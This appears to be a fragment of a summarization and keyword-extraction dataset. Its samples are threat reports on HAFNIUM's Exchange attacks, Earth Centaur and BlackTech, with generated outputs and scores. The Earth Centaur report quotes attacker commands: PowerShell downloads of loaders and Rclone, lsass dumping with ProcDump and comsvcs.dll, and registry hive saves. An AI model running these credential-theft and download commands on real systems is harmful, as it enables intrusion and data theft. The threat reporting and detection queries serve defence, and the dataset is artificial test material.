| where FileName != \"wermgr.exe\" | where FileName != \"WerFault.exe\"Please note excessive spawning of wermgr.exe and WerFault.exe could be an indicator of compromise due to the service crashing during deserialization.Azure Sentinel advanced hunting queriesAzure Sentinel customers can find a Sentinel query containing these indicators in the Azure Sentinel Portal or at this GitHub location: url Sentinel/tree/master/Detections/MultipleDataSources/.Look for Nishang Invoke-PowerShellTcpOneLine in Windows Event Logging:SecurityEvent | where EventID == 4688 | where Process has_any (\"powershell.exe\", \"PowerShell_ISE.exe\") | where CommandLine has \"$client = New-Object System.Net.Sockets.TCPClient\"Look for downloads of PowerCat in cmd and Powershell command line logging in Windows Event Logs:SecurityEvent | where EventID == 4688 | where Process has_any (\"cmd.exe\", \"powershell.exe\", \"PowerShell_ISE.exe\") | where CommandLine hasurl targeting Exchange Servers with 0-day exploits - Microsoft Security\"url\"Look for Exchange PowerShell Snapin being loaded. This can be used to export mailbox data, subsequent command lines should be inspected to verify usage:SecurityEvent | where EventID == 4688 | where Process has_any (\"cmd.exe\", \"powershell.exe\", \"PowerShell_ISE.exe\") | where isnotempty(CommandLine) | where CommandLine contains \"Add-PSSnapin Microsoft.Exchange.Powershell.Snapin\" | summarize FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by Computer, Account, CommandLineurl ", "generated_text": "attack; Microsoft Exchange Server; 0-day; CVE-2021-26855; CVE-2021-26858; CVE-2021-27065; organizations; the U.S.; China; these vulnerabilities; email accounts; additional malware; long-term access; the attacker; the vulnerabilities; CVE-2021-26855; CVE-2021-26858; CVE-2021-27065; Microsoft Security Response Center; MSRC; mitigation guidance; threats; email accounts; email passwords; file sharing sites; File sharing; a script; the exploit chain; this campaign; high confidence; Chinese.", "ref_text": "<START-1>The PDF describes attacks by a Chinese state-sponsored threat actor named HAFNIUM targeting on-premises Microsoft Exchange Servers. HAFNIUM exploited multiple 0-day vulnerabilities to gain initial access and install web shells for long-term persistence. The vulnerabilities exploited were CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065. Microsoft released patches and urged customers to update Exchange Servers immediately. Once compromised, HAFNIUM used tools like Procdump and PowerCat to dump credentials, download additional payloads, and exfiltrate data. They focused on entities in the US across sectors like infectious disease and law firms. Indicators of compromise and detection guidance are provided, including Exchange server logs to analyze, antivirus detections, and advanced hunting queries. The report aims to help security teams investigate potential compromise and defend against HAFNIUM. In summary, the PDF provides technical details on zero-day exploits used by HAFNIUM to compromise on-premises Exchange Servers and entrench access. It equips defenders with specific IOCs and detections to enable investigation and response. <END-1>", "t5/keyword/hint_hit_precision": 0.25806451612903225, "t5/word/hint_hit_recall": 0.07142857142857142, "gpt3/lexical/rouge_rouge1": 0.5185185185185186, "gpt3/lexical/rouge_rouge2": 0.1925465838509317, "gpt3/lexical/rouge_rougeL": 0.3271604938271605, "gpt3/lexical/rouge_rougeLsum": 0.3271604938271605, "gpt3_generated_text": ["The article discusses a recent targeted attack on Microsoft Exchange Servers by a group known as HAFNIUM, believed to be state-sponsored and operating out of China. The attackers exploited multiple 0-day vulnerabilities, including CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065, to gain access to email accounts, install malware, and maintain long-term access to victim environments. Microsoft has released security updates and mitigation guidance to address these vulnerabilities and urges organizations to patch their systems immediately. HAFNIUM primarily targets entities in the U.S. across various industries, including infectious disease researchers, law firms, and defense contractors. The group operates from leased virtual private servers in the U.S. Microsoft is providing technical details to help customers defend against future attacks. The article emphasizes the importance of patching systems to prevent exploitation and highlights the need for collaboration and intelligence sharing within the security community to enhance overall security."]}, {"split_name": "val", "sample_id": "val_71", "prompt_text": "Extract the keywords: Tropic Trooper Targets Transportation and Government Organizationstrendmicro.com/en_us/research/21/l/collecting-in-the-dark-tropic-trooper-targets-transportation-and-government-organizations.htmlDecember 14, 2021Collecting In the Dark: Tropic Trooper Targets Transportation and Government Our long-term monitoring of the cyberespionage group Earth Centaur (aka Tropic Trooper) shows that the threat actors are equipped with new tools and techniques. The group seems to be targeting transportation companies and government agencies related to transportation.By: Nick Dai, Ted Lee, Vickie Su December 14, 2021 Read time: 11 min (3068 words)Earth Centaur, previously known as Tropic Trooper, is a long-running cyberespionage threat group that has been active since 2011. In July 2020, we noticed interesting activity coming from the group, and we have been closely monitoring it since. The actors seem to be targeting organizations in the transportation industry and government agencies related to transport.We observed that the group tried to access some internal documents (such as flight schedules and documents for financial plans) and personal information on the compromised hosts (such as search histories). Currently, we have not discovered substantial damage to these victims as caused by the threat group. However, we believe that it will continue collecting internal information from the compromised victims and that it is simply waiting for an opportunity to use this data.Through long-term monitoring, we learned that this threat group is proficient at red teamwork. The group knows how to bypass security settings and keep its operation unobstructive. Depending on the target, it uses backdoors with different protocols, and it can also use the reverse proxy to bypass the monitoring of network security systems. The usage of the open-source frameworks also allows the group to develop new backdoor variants efficiently. We expand on these techniques and other capabilities in the following sections.More importantly, we believe the activities we observed are just the tip of the iceberg and their targets might be expanded to other industries that are related to transportation. It is our aim, through this article, to encourage enterprises to review their own security setting and protect themselves from damage and compromise.Overview of Earth Centaur\u2019s infection chain Based on our investigation, we found that the intrusion process used by Earth Centaur can be separated into several stages, which are shown in Figure 1.1/16We found that the threat actors used vulnerable Internet Information Services (IIS) server and Exchange server vulnerabilities as entry points, and then installed web shells. Afterward, the .NET loader (detected as Nerapack) and the first stage backdoor (Quasar remote administration tool aka Quasar RAT) were deployed on the compromised machine. Then, depending on the victims, the threat actors dropped different types of second-stage backdoors, such as ChiserClient and SmileSvr.After exploiting the victim's environments successfully, the threat actors start Active Directory (AD) discovery and spread their tools via Server Message Block (SMB). Then, they use intranet penetration tools to build the connection between the victim\u2019s intranet and their command-and-control (C&C) servers. We go into further detail about these stages in our analysis.Figure 1. Stages of Earth Centaur\u2019s intrusion processTechnical Analysis of Earth Centaur\u2019s Tools and TechniquesStage 1: LoadersAfter the threat actors get access to the vulnerable hosts by using ProxyLogon exploits and web shells, they use bitsadmin to download the next-stage loader (loaders are detected as Nerapack) as well as its payload file (.bin).C:\\Windows\\system32\\windowspowershell\\v1.0\\powershell.exe -Command \"&{Import-Module BitsTransfer; Start-BitsTransfer 'url \"%temp%/dfmanager.exe\"}\"C:\\Windows\\system32\\windowspowershell\\v1.0\\powershell.exe -Command \"&{Import-ModuleBitsTransfer; Start-BitsTransfer 'url \"C:\\Users\\ <redacted>\\AppData\\Local\\Temp/dfmanager.bin\"}\"2/16After our long-term monitoring, we observed that there are two different decryption algorithms (DES or AES) used in Nerapack to decrypt the payload. Moreover, in its newer version, it uses a technique called \u201cTimestomping.\u201d Timestomping is when the timestamp of the payload file (.bin) is altered to make it harder for incident response analysts to find it.Figure 2. Timestomping used on the bin fileThe decryption key is used as an argument of Nerapack and various keys are used on different victims. It is a simple but effective technique that makes security analysis more difficult and also ensures that only their operators can use the tools.The command for execution is shown as here:> Nerapack.exe {base64 encoded key}Fortunately, we were still able to collect the decryption key in some cases and we decrypted the payload successfully. Based on our current cases, the decrypted payload is Quasar RAT. After the payload is deployed, the actors can continue further malicious actions through Quasar RAT.Stage 2: BackdoorsAfter further analysis, we found that the threat group developed multiple backdoors capable of communication via common network protocols. We think this indicates that it has the capability to bypass network security systems by using these common protocols to transfer data. We also found that the group tries to launch various backdoors per victim. Furthermore, it also tends to use existing frameworks to make customized backdoors. By using existing frameworks, examples of which are detailed in the following, it builds new backdoor variants more efficiently.ChiserClientAfter the backdoor is launched, it will decrypt the embedded C&C configuration via AES (CTR mode) algorithm for the following connection. In the configuration, there are three C&C addresses and corresponding port numbers.3/16Figure 3. Decrypted C&C configurationIn the first connection, ChiserClient will append the host name of the compromised host for check-in purposes. Then, it will keep running on the hosts and wait for further commands from the C&C server.ChiserClient is installed as a system service to allow the threat actors access to higher privileges and keep persistence on the compromised host. The capability of ChiserClient is shown in the following table:Command code Function0x100010x100020x100030x100040x10005HTShellWrite specified fileDownload FileRead specified fileNo ActionOpen a command shell for command executionHTShell is a simple backdoor that is developed using the Mongoose framework (version 6.15). Mongoose is an Object Data Modeling (ODM) library for MongoDB and Node.Js. It is used to translate between objects in code and objects representation in MongoDB.We saw in our cases that the HTShell client will be launched as a system service on the compromised machine and that it will connect to a C&C server. HTShell supports importing additional config files. We found that the additional config file is located in %PUBLIC%\\Documents\\sdcsvc.dat, and that the content should be encoded by base64. If no config file is imported, it will connect to the predefined C&C address.4/16Figure 4. HTShell hardcoded C&CsHTShell encodes a hard -coded string, \"tp===\" with custom base64 and embeds the encoded string in the request cookies. If the C&C server receives the request with the special cookie value, it can verify that the request comes from its client applications.Figure 5. HTShell hardcoded and encoded cookie string in the request headerThe response handler of HTShell will use \u201c`\u201d as delimiter to split the command code and argument for the received command. Hence, the command will be this format:<command code>`<custom-base64encoded-data>[`<more-custom-base64encoded-data>]HTShell currently supports three different backdoor functions, shown here:Command code Function01Open a command shell for command executionUpload file5/162Download fileCustomized Lilith RATDuring our investigation into Earth Centaurs activities, we found that it also uses another backdoor called Lilith RAT. We think that this Lilith RAT is a highly modified version of the open-source Lilith RAT. The actors reused part of the codes for command execution, while the C&C protocol is changed to Dropbox HTTPS APIs.Figure 6. Reused codes from open-source Lilith RATIn order to launch this RAT, the threat actors use a technique called \"Phantom DLL hijacking.\" In this technique, the RAT will be disguised as the normal wlbsctrl.dll. While the Windows service \u201cIKEEXT\u201d is starting, the fake wlbsctrl.dll is loaded and executed with high privilege. Furthermore, when Lilith RAT is terminated, it will try to clean itself to prevent being found by investigators.Figure 7. Self-deletion after executionFor the C&C connections, the customized Lilith RAT will first check in to the attacker\u2019s Dropbox and see if the victim host exists. If not, the hostname and IP address will be collected and appended to the existing compromised hosts\u2019 information. All data will then be encrypted and sent back.6/16Figure 8. The first check-in request to the Dropbox C&CAfter the check-in request, the backdoor will start to wait for more commands to come in. All the request data are formatted to JSON, and they are encrypted by AES and encoded by base64.Here is a list of the C&C commands:CommandDescriptionCMDCommandExecutes commandsDownloadCloudFile Downloads filesUploadCloudFileUploads filesGetDirGetDirFileLists directoriesLists files in a directory7/16DeleteSelfDeletes itselfSmileSvrWe found that there are two types of SmileSvr. The difference between the two variants is the protocol used for communication: ICMP and SSL. The threat actors will use an installer to install SmileSvr as a system service and drop a DAT file that contains encoded C&C information. In the configuration file, the memory size used for storing C&C address and C&C address will be defined.Figure 9. Encrypted configuration fileThe ICMP version of SmileSvr will create an ICMP socket to connect to the specified C&C address, which is defined in a configuration file. In each SmileSvr, there is an embedded number (e.g., 10601 in Figure 10.) and this value will be used as sequence number in the sent ICMP packet. We think attackers use this value to verify if the incoming packet belongs to their backdoor and filter out the noise.Figure 10. Decrypted configuration fileWithout knowing the real traffic from the C&C server, we can only speculate on the content of the response based on the receiving function. As shown in Figure 11, the content of the response should contain the sequence number used to verify if the received data comes from the correct source and two blocks of encrypted data.The data decryption procedure is as follows:1. First, the encrypted data is decrypted with a one-byte XOR key (0xFF). 2. The first of the decrypted content contains a magic number used to check data in the second block,a command code, and the XOR key to decrypt the second set of encrypted content.3. The second set of encrypted content is decrypted with an XOR key (0x99) from the previousdecrypted content, and within the decrypted data are instructions for the following procedures.8/16Figure 11. SmileSvr packet traffic format simulationWhile analyzing samples, we found that the C&C server was already inactive. Without knowing the traffic between SmileSvr and C&C server, we could not fully understand all functions. However, most of the backdoor functions are listed here:Command code Function0x50010x50020x50040x50060x50070x50090x500A0x500C0x500EOpens/Reads specified fileUnknownOpens/Writes specified fileOpens command shellUnknownCloses command shellFile System TraversalChecks environment informationUnknownAs for the SSL version of SmileSvr, the capability of SSL communication is built by using wolfSSL, which is a lightweight, C-language based SSL/TLS library. The backdoor functions of SSL version SmileSvr are similar to the ICMP ones. The threat actors just use it to develop new ways to support data transfer via an encrypted channel.Customized Gh0st RAT9/16In our investigation, we also found a suspicious executable named telegram.exe. After analyzing the file, we found that it was a customized version of Gh0st RAT. Compared to the original Gh0st RAT (Gh0st beta 3.6), the difference is that the customized version supports a new function to discover information from active sessions on the host.All supported functions for the customized Gh0st are shown in the following table:Command code Function0xC80xCA0xCB0xCC0XD5Terminates connectionFile manager to handle file operationsScreen monitoringOpens remote shell for command executionGets active session informationPost-ExploitationAfter successfully exploiting the vulnerable system, the threat actor will use multiple hacking tools to discover and compromise machines on the victim\u2019s intranet. In this stage, we also observed attempts to deploy tools to exfiltrate stolen information.During our investigation, we found evidence of specific tools, which we listed in Table 1. With these tools, the attackers accomplish their goals (network discovery, access to the intranet, and exfiltration) step by step.Tool namePurposeDescriptionSharpHound AD Discovery Discovery tool to understand the relationship in an AD environmentFRPCChiselIntranet PenetrationIntranet PenetrationFast reverse proxy to help expose a local server behind a NAT or firewall to the internetFast TCP/UDP tunnelRCloneExfiltrationA command-line program to sync files and directories to and from different cloud storage providersCredential DumpingWe also observed that the group used multiple legitimate tools to dump credentials on compromised machines. It made good use of these tools to achieve its goal and keep its operation hidden and unobstructive.For example, the group uses ProcDump.exe (a tool from Windows Sysinternals Suite that creates dumps of the processes in any scenario), which it renamed bootsys.exe:10/16c:\\users\\public\\downloads\\bootsys.exe -accepteula -ma lsass.exeC:\\Users\\Public\\Downloads\\lsass.dmpThe group dumps credentials stored in registries by using reg.exe:reg.exe save hklm\\sam C:\\Users\\Public\\Downloads\\sam.hivereg.exe save hklm\\sam c:\\windows\\temp\\sa.ditreg.exe save hklm\\security c:\\windows\\temp\\se.ditreg.exe save hklm\\system c:\\windows\\temp\\sy.ditThe group would also dump memory from the specified process by using comsvcs.dll:rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 764 C:\\Windows\\TEMP\\dump.bin fullIndicator RemovalTo avoid exposing their footprints to investigators, the threat actors made their own tool to wipe out the event logs on the victimized machine. By using this tool, they could clean specified event logs and make it hard for investigators to track their operations.The usage is as follows:Intranet PenetrationAfter successfully exploiting the vulnerable system, threat actors also drop following tools: FRP and Chisel. FRP is a fast reverse proxy used to expose a local server behind an NAT or a firewall to the internet. It can read predefined configurations and make the host in the intranet available to users from the internet.11/16Figure 12. Configuration for FRP fast reverse proxyChisel is a fast TCP/UDP tunnel, which is mainly used for passing through firewalls. It provides the capability to transport data over HTTP (secured via Secure Shell, aka SSH) and allows threat actors to network infrastructure and bypass the firewall. Afterward, we observed a PowerShell command used to download an effective tool, Rclone, which is used for exfiltration. It also provides an easy and effective way of copying data to several cloud storage providers.C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -command \"$(new-objectSystem.Net.WebClient).DownloadFile('url 'r.exe')\"Based on previous experience, Rclone has frequently been used in ransomware attacks to exfiltrate stolen data. However, it seems that currently, it is not only used in ransomware attacks but also in APT attacks.Identifying Features in the Earth Centaur Campaign12/16After long-term observation and analysis of the attack campaigns, there was compelling evidence that they were operated by Earth Centaur. We found several identifying features of the threat actors within the techniques and tools described in the preceding sections, and we break down the factors in the following.Mutex StyleWe found some special mutexes that are encoded by the layout of the Chinese Zhuyin keyboard in ChiserClient. The decoded string is shown in Table 2. Based on these special mutex strings, we believe the threat actors come from a Chinese-speaking region.Encoded stringDecoded string in Chinese English translationvul3ru,6q8 q8 y.3ji394su3Jack goes aroundI love you5ji fu.6cl3g.3zj6m0694 Excellent table tennis player, Ai FukuharaTable 2. Encoded/Decoded mutex stringConfiguration styleAfter analyzing the ChiserClient, we found that it shares a similar style of network configuration to the TClient mentioned in our previous research on Earth Centaur.Figure 13. Network configuration (Left: ChiserClient Right: TClient)Code SimilarityAfter checking the backdoor SmileSvr, we found that there was a code similarity between it and Troj_YAHAMAM, which was used by Earth Centaur in an earlier operation. Both share similar codes in configuration decoding, which is shown in Figure 14. Furthermore, the delimiter that was used in13/16SmileSvr to split different values in configuration files is the same as the one used in YAHAMAM (shown as Figure 15).Figure 14. Configuration decoding function (left: SmileSvr right: Troj_Yahamam)14/16Figure 15. Function used to split different values in configuration file (left: SmileSvr right: Troj_Yahamam)ConclusionThese threat actors are notably sophisticated and well-equipped. Looking deeper into the new methods the group uses, we found that it has an arsenal of tools capable of assessing and then compromising its targets while remaining under the radar. For example, the group can map their target\u2019s network infrastructure and bypass firewalls. It uses backdoors with different protocols, which are deployed depending on the victim. It also has the capability to develop customized tools to evade security monitoring in different environments, and it exploits vulnerable websites and uses them as C&C servers.In this blog, we outlined our new findings related to these threat actors to help possible targets in the transportation and other industries. Information on how a threat enters and operates within a victim\u2019s network is invaluable to security teams and can help them create more effective protection for vulnerable organizations. Organizations can also find capable security solutions that can help interpret and respond to malicious activities, techniques, and movements before the threat can culminate and affect an enterprise. Trend Micro Vision One\u2122 with Managed XDR gives security teams a consolidated view into valuable insights so they can organize a more solid line of defense ahead of attacks.For a list of the Indicators of Compromise, please see this document.MITRE ATT&CK MatrixTacticsInitial accessExecutionIDTechniqueT1190Exploit public-facing applicationT1059.001 Command and Scripting Interpreter: PowerShellT1059.003 Command and scripting interpreter: Windows Command Shell15/16T1569.002 System Services: Service ExecutionPersistenceT1543.003 Create or Modify System Process: Windows ServiceDefense evasionT1574.002 Hijack Execution Flow: DLL Side-LoadingT1505.003 Server Software Component: Web ShellT1140T1480Deobfuscate/Decode Files or InformationExecution GuardrailsT1574.002 Hijack Execution Flow: DLL Side-LoadingT1070.001 Indicator Removal on Host: Clear Windows Event LogsT1027.002 Obfuscated Files or Information: Software PackingT1218.011 Signed Binary Proxy Execution: Rundll32T1036.005 Masquerading: Match Legitimate Name or LocationT1197BITS JobsT1070.006 Indicator Removal on Host: TimestompCredential AccessT1003.001 OS Credential Dumping: LSASS MemoryT1552.002 OS Credential Dumping: Credentials in RegistryLateral MovementT1021.002 Remote Services: SMB/Windows Admin SharesDiscoveryT1087.002 Account Discovery: Domain AccountT1482T1083T1005Domain Trust DiscoveryFile and Directory DiscoveryData from Local SystemCollectionCommand and control T1071.001 Application layer protocol: web protocolsT1095Non-Application layer protocolT1090.001 Proxy: Internal ProxyExfiltrationT1567.002 Exfiltration to Cloud Storage16/16 ", "generated_text": "a long-running cyberespionage threat group; Earth Centaur; 2011; transportation companies; government agencies; transportation documents; documents; financial plans; documents; time; day; the loader; Nerapack; Quasar RAT; ChiserClient; SmileSvr; AD discovery; Server Message Block; SMB; Intranet penetration tools; the connection; Command; Control; servers; the intrusion; Indicators; compromise; Enterprises; the group; intrusion techniques.", "ref_text": "<START-1>The PDF describes the cyberespionage activities of an advanced persistent threat (APT) group called Earth Centaur or Tropic Trooper. The group has been active since 2011 targeting transportation companies and government agencies related to transportation. The initial intrusion involves exploiting vulnerabilities like ProxyLogon in Exchange Server to gain access. Web shells are used to install loaders like Nerapack, which retrieves next-stage payloads like the Quasar RAT. Multiple customized backdoors are deployed on compromised systems, communicating over common protocols like ICMP or HTTPS to blend in with normal traffic. Backdoors like ChiserClient, HTShell, Lilith RAT, and SmileSvr support functions like command execution, file operations, and exfiltration. The group uses open-source malware frameworks like Mongoose and WolfSSL to efficiently build new backdoor variants. Evasion techniques include timestomping, encrypted configurations, process injection, and self-deletion. After intruding, the group conducts discovery of Active Directory and internal systems. Tools like SharpHound, FRPC, Chisel, and Rclone are used for lateral movement, tunneling, and exfiltration. Credentials are dumped using built-in Windows utilities. Attribution to Earth Centaur is based on shared code, configurations, and mutex styles with previous campaigns. The group seems to originate from a Chinese-speaking region. Recommendations include reviewing security controls, using multilayered protections, and leveraging threat intelligence to gain insights into malware behaviors and quickly detect intrusions. <END-1>", "t5/keyword/hint_hit_precision": 0.43333333333333335, "t5/word/hint_hit_recall": 0.08490566037735849, "gpt3/lexical/rouge_rouge1": 0.43975903614457834, "gpt3/lexical/rouge_rouge2": 0.12727272727272726, "gpt3/lexical/rouge_rougeL": 0.2530120481927711, "gpt3/lexical/rouge_rougeLsum": 0.2530120481927711, "gpt3_generated_text": ["Earth Centaur, previously known as Tropic Trooper, is a cyberespionage threat group that has been active since 2011. Recent activity indicates that the group is targeting transportation companies and government agencies related to transportation, seeking access to internal documents such as flight schedules and financial plans. The group utilizes various tools and techniques in its intrusion process, including loaders like Nerapack and backdoors like Quasar RAT, ChiserClient, and SmileSvr. Additionally, the threat actors engage in AD discovery, use SMB for spreading tools, and employ intranet penetration tools to establish connections with their command-and-control servers. Enterprises are encouraged to review their security settings to protect themselves from potential compromise by this sophisticated threat group."]}, {"split_name": "val", "sample_id": "val_72", "prompt_text": "Extract the keywords: Trend MicroAbout TrendLabs Security Intelligence BlogGo to\u2026\u25bcHome \u00bb Targeted Attacks \u00bb Following the Trail of BlackTech\u2019s Cyber Espionage CampaignsFollowing the Trail of BlackTech\u2019s Cyber Espionage CampaignsPosted on: June 22, 2017 at 5:05 amPosted in: Targeted Attacks Author: TrendMicro3by Lenart Bermejo, Razor Huang, and CH Lei (Threat Solution Team)BlackTech is a cyber espionage group operating against targets in East Asia, particularly Taiwan, and occasionally, Japan and Hong Kong. Based on the mutexes and domain names of some of their C&C servers, BlackTech\u2019s campaigns are likely designed to steal their target\u2019s technology.Following their activities and evolving tactics and techniques helped us uncover the proverbial red string of fate that connected three seemingly disparate campaigns: PLEAD, Shrouded Crossbow, and of late, Waterbear.Over the course of their campaigns, we analyzed their modus operandi and dissected their tools of the trade\u2014and uncovered common denominators indicating that PLEAD, Shrouded Crossbow, and Waterbear may actually be operated by the same group.PLEAD PLEAD is an information theft campaign with a penchant for confidential documents. Active since 2012, it has so far targeted Taiwanese government agencies and private organizations. PLEAD\u2019s toolset includes the self-named PLEAD backdoor and the DRIGO exfiltration tool. PLEAD uses spear-phishing emails to deliver and install their backdoor, either as an attachment or through links to cloud storage services. Some of the cloud storage accounts used to deliver PLEAD are also used as drop off points for exfiltrated documents stolen by DRIGO.PLEAD\u2019s installers are disguised as documents using the right-to-left-override (RTLO) technique to obfuscate the malware\u2019s filename. They are mostly accompanied by decoy documents to further trick users. We\u2019ve also seen PLEAD use exploits for these vulnerabilities:CVE-2015-5119, patched by Adobe last July, 2015 CVE-2012-0158, patched by Microsoft last April, 2012 CVE-2014-6352, patched by Microsoft last October, 2014 CVE-2017-0199, patched by Microsoft last April, 2017PLEAD also dabbled with a short-lived, fileless version of their malware when it obtained an exploit for a Flash vulnerability (CVE-2015-5119) that was leaked during the Hacking Team breach.Featured StoriesIIS 6.0 Vulnerability Leads to Code ExecutionWinnti Abuses GitHub for C&C CommunicationsMajikPOS Combines PoS Malware and RATs to Pull Off its Malicious TricksNew Linux Malware Exploits CGI VulnerabilityCVE-2017-5638: Apache Struts 2 Vulnerability Leads to Remote Code ExecutionBusiness Process CompromiseAttackers are starting to invest in long- term operations that target specific processes enterprises rely on. They scout for vulnerable practices, susceptible systems and operational loopholes that they can leverage or abuse. To learn more, read our Security 101: Business Process Compromise.Business Email CompromiseHow can a sophisticated email scam cause more than $2.3 billion in damages to businesses around the world? See the numbers behind BECLatest Ransomware PostsAdGholas Malvertising Campaign Employs Astrum Exploit KitErebus Resurfaces as Linux RansomwareAnalyzing the Fileless, Code-injecting SOREBRECT RansomwareVictims Lost US$1B to RansomwareAfter WannaCry, UIWIX Ransomware and Monero-Mining Malware Follow SuitRecent PostsFollowing the Trail of BlackTech\u2019s Cyber Espionage CampaignsAdGholas Malvertising Campaign Employs Astrum Exploit KitErebus Resurfaces as Linux RansomwareYour email hereSubscribeFigure 1: How PLEAD utilizes compromised routersThis infographic shows how ransomware has evolved, how big the problem has become, and ways to avoid being a ransomware victim. Check the infographicNew post: Following the Trail of BlackTech\u2019s Cyber Espionage Campaigns bit.ly/2rZ2RLz @TrendMicro about 4 hours agoAnalyzing the Fileless, Code-injecting SOREBRECT RansomwareAnalyzing Xavier: An Information-Stealing Ad Library on AndroidMouse Over, Macro: Spam Run in Europe Uses Hover Action to Deliver Banking TrojanErebus Resurfaces as Linux Ransomware#Erebus ransomware resurfaces, takes the spotlight in our latest #ransomware recap. bit.ly/2tQHfTcAnalyzing the Fileless, Code-injecting SOREBRECT RansomwareMicrosoft Patches Windows XP Again As Part of June Patch Tuesdayabout 6 hours agoStay UpdatedMassive WannaCry/Wcry Ransomware Attack Hits Various CountriesAre cities ready to roll out #IoT on a massive scale? bit.ly/2rrdJ6vRansomware 101Popular PostsLatest Tweetsabout 3 hours agoEmail SubscriptionPLEAD actors use a router scanner tool to scan for vulnerable routers, after which the attackers will enable the router\u2019s VPN feature then register a machine as virtual server. This virtual server will be used either as a C&C server or an HTTP server that delivers PLEAD malware to their targets.PLEAD also uses CVE-2017-7269, a buffer overflow vulnerability Microsoft Internet Information Services (IIS) 6.0 to compromise the victim\u2019s server. This is another way for them to establish a new C&C or HTTP server.Figure 2: One of the methods PLEAD operators use to distribute their malwarePLEAD\u2019s backdoor can:Harvest saved credentials from browsers and email clients like Outlook List drives, processes, open windows, and files Open remote Shell Upload target file Execute applications via ShellExecute API Delete target filePLEAD also uses the document-targeting exfiltration tool DRIGO, which mainly searches the infected machine for documents. Each copy of DRIGO contains a refresh token tied to specific Gmail accounts used by the attackers, which are in turn linked to a Google Drive account. The stolen files are uploaded to these Google Drives, where the attackers can harvest them.Shrouded Crossbow This campaign, first observed in 2010, is believed to be operated by a well-funded group given how it appeared to have purchased the source code of the BIFROST backdoor, which the operators enhanced and created other tools from. Shrouded Crossbow targeted privatized agencies and government contractors as well as enterprises in the consumer electronics, computer, healthcare, and financial industries.Shrouded Crossbow employs three BIFROST-derived backdoors: BIFROSE, KIVARS, and XBOW. Like PLEAD, Shrouded Crossbow uses spear-phishing emails with backdoor-laden attachments that utilize the RTLO technique and accompanied by decoy documents.BIFROSE, known for evading detection by communicating with its C&C servers via Tor protocol, also has a version targeting UNIX-based operating systems, which are usually used in servers, workstations, and mobile devices. KIVARS has less functionality than BIFROSE, but its modularstructure made it easier to maintain. KIVARS enabled attackers to download and execute files, list drives, uninstall malware service, take screenshots, activate/deactivate keylogger, show/hide active windows, and trigger mouse clicks and keyboard inputs. A 64-bit version of KIVARS also emerged to keep pace with the popularity of 64-bit systems. XBOW\u2019s capabilities are derived from BIFROSE and KIVARS; Shrouded Crossbow gets its name from its unique mutex format.Waterbear Waterbear has actually been operating for a long time. The campaign\u2019s name is based on its malware\u2019s capability to equip additional functions remotely.Waterbear similarly employs a modular approach to its malware. A loader component executable will connect to the C&C server to download the main backdoor and load it in memory. A later version of this malware appeared and used patched server applications as its loader component, while the main backdoor is either loaded from an encrypted file or downloaded from the C&C server.The tactic it later adopted required prior knowledge of their targets\u2019 environment. It\u2019s possible attackers used Waterbear as a secondary payload to help maintain presence after gaining some levels of access into the targets\u2019 systems.All Roads Lead to BlackTech Based on the use of the same C&C servers, the campaigns\u2019 coordinated efforts, and similarities in tools, techniques, and objectives, we can conclude that they are operated by the same group. It is not uncommon, for instance, for a group\u2014especially a well-funded one\u2014to split into teams and run multiple campaigns. While most of the campaigns\u2019 attacks are conducted separately, we\u2019ve seen apparently joint operations conducted in phases that entail the work of different teams at each point in the infection chain.Use of the Same C&C Servers. In several instances, we found the campaigns\u2019 malware communicating with the same C&C servers. In targeted attacks, C&C servers are typically not shared with other groups. Here are some of the C&C servers we found that are shared by the campaigns:C&C Serveritaiwans[.]commicrosoftmse[.]comPLEADShrouded CrossbowWaterbearYesYesNoYesYesNo211[.]72[.]242[.]120 No Table 1: C&C servers shared by PLEAD, Shrouded Crossbow, and WaterbearYesYesAdditionally, the IP 211[.]72 [.]242[.]120 is one of the hosts for the domain microsoftmse[.]com, which has been used by several KIVARS variants.Joint Operations. We also found incidents where the backdoors were used on the same targets. While it\u2019s possible for separate groups to attack at the same time, we can construe at they are at least working together:PLEADShrouded CrossbowSamples from the same group using the same filenameLoader component named after its target, i.e. {target name}.exeLoader component named after its target, i.e. {target name}.exe or {target name}64.exeBackdoors using the same C&C serversConnected to 211[.]72[.]242[.]120:53Connected to 211[.]72[.]242[.]120:443Timeline indicating arrival orderArrived two days after initial infection by SCEstablished presence two years prior, but re-infected at a recent timeTable 2: Incident where PLEAD and KIVARS attack the same targetPLEADvmdks.exeShrouded Crossbowcfbcjtqx.dllSamples found in same machineTimeline of infection3/16/20172/23/2017Waterbeartpauto.dll3/8/2017Table 3: Incidents where PLEAD, KIVARS, and Waterbear were used on the same targetSimilarities between tools and techniques. PLEAD and KIVARS, for instance, share the use of RTLO techniques to disguise their installers as documents. Both also use decoy documents to make the RTLO attack more convincing. Another similarity is the use of a small loader component to load encrypted backdoors into memory.Similar Objectives. The ulterior motive of these campaigns is to steal important documents from their victims; initial recipients of their attacks are not always their primary target. For instance, we saw several decoy documents stolen by the attackers that are then used against another target. This indicates that document theft is most likely the first phase of an attack chain against a victim with ties to the intended target. While PLEAD and KIVARS are most likely to be used in first phase attacks, Waterbear can be seen as a secondary backdoor installed after attackers have gained a certain level ofprivilege.Based on the type of documents stolen by these campaigns, we can get a clearer view of who they\u2019re targeting and compromising, the purpose of their campaigns, and when they take place. Below are some of the categories or labels of the stolen documents:Address book Human affairsInternal affairs ScheduleEnterprises Need to be Proactive PLEAD, Shrouded Crossbow, and Waterbear are still actively mounting their campaigns against its targets, which is why organizations must proactively secure their perimeter.IT/system administrators and information security professionals can consider making a checklist of what to look out for in the network for any signs of anomalies and suspicious behavior that can indicate intrusions. Adopting best practices and employing multilayered security mechanisms and strategies against targeted attacks are also recommended. Network traffic analysis, deployment of firewalls and intrusion detection and prevention systems, network segmentation, and data categorization are just some of them.Trend Micro SolutionsTrend Micro\u2122 Deep Discovery\u2122 provides detection, in-depth analysis, and proactive response to today\u2019s stealthy malware, and targeted attacks in real-time. It provides a comprehensive defense tailored to protect organizations against targeted attacks and advanced threats through specialized engines, custom sandboxing, and seamless correlation across the entire attack lifecycle, allowing it to detect threats like the above mentioned zero-day attacks even without any engine or pattern update.Trend Micro\u2122 Deep Security\u2122 and Vulnerability Protection provide virtual patching that protects endpoints from threats that abuses unpatched vulnerabilities. OfficeScan\u2019s Vulnerability Protection shield endpoints from identified and unknown vulnerability 